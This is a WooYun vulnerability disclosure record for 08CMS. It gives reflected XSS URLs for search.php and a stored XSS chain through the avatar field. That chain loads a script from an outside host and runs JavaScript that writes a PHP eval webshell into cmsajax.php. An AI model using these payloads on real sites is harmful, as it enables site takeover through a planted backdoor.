{"id": 6767, "wybug_id": "wooyun-2013-044261", "wybug_title": "08cms存储型XSS可getshell（较鸡肋）", "wybug_corp": "08CMS", "wybug_author": "redrain有节操", "wybug_date": "2013-11-28 15:05", "wybug_open_date": "2014-01-12 15:06", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-28：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-01-12：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 用户在前台构造xss，管理在后台直接getshell 详细说明：  赠送几个反射型：搜索处存在反射性xss\n/search.php?caid=2&ccid1=208&chid=4&djfrom=1&djto=1<ScRiPt%2520>prompt(968256)</sCripT>\n\n/search.php?caid=2&ccid1=208&chid=4&djfrom=1<ScRiPt%2520>prompt(981700)</sCripT>\n\n/search.php?caid=4&chid=2&mchid=1&zjfrom=1<ScRiPt%2520>prompt(966559)</sCripT>\n\n/search.php?caid=4&chid=2&mchid=1&zjfrom=1&zjto=1<ScRiPt%2520>prompt(922207)</sCripT>\n用户在前台修改头像的时候发现可以外部调用，仅仅是检查了后缀，然后在附件的地方插入http://xxx.com/\"><script>alert(1)</script>adminc/images/logo_member.png返回我的首页，发现成功的触发了xss再插入http://xxx.com/\"><script src=\"http://xxx.js\"></script><img src=\"http://www.baidu.com/img/bdlogo.gif管理员后台查看后（可和管理反应，哎呀，我的头像有问题啊，之类的），成功地触发了成功的getshell cmsajax.php 密码fuckhelengetshell的payload如下：\ndocument.writeln(\"<script src=http://xss.tw/5237></script>\");function ajax(){\tvar request = false;\tif(window.XMLHttpRequest) {\t\trequest = new XMLHttpRequest();\t} else if(window.ActiveXObject) {\t\tvar versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];\t\tfor(var i=0; i<versions.length; i++) {\t\t\ttry {\t\t\t\trequest = new ActiveXObject(versions[i]);\t\t\t} catch(e) {}\t\t}\t}\treturn request;}var _x = ajax();postgo();function postgo() {\tsrc=\"/admina.php?entry=csstpls&action=filedetail&filename=cmsajax.php&jsmode=1&forward=\";\tdata=\"contentnew=%3C%3Fphp+eval%28%24_POST%5Bfuckhelen%5D%29%3B+%3F%3E&bfiledetail=%CC%E1%BD%BB\";\txhr_act(\"POST\",src,data);\t}function xhr_act(_m,_s,_a){\t_x.open(_m,_s,false);\tif(_m==\"POST\")_x.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");\t_x.send(_a);\treturn _x.responseText;}\n   漏洞证明：  \n\n\n\n   修复方案：     版权声明：转载请注明来源 redrain有节操@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-11-28 20:00 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  wow！！！好酷炫！！！    \n     2014-01-12 18:36 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  wow！！！好酷炫！！！    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}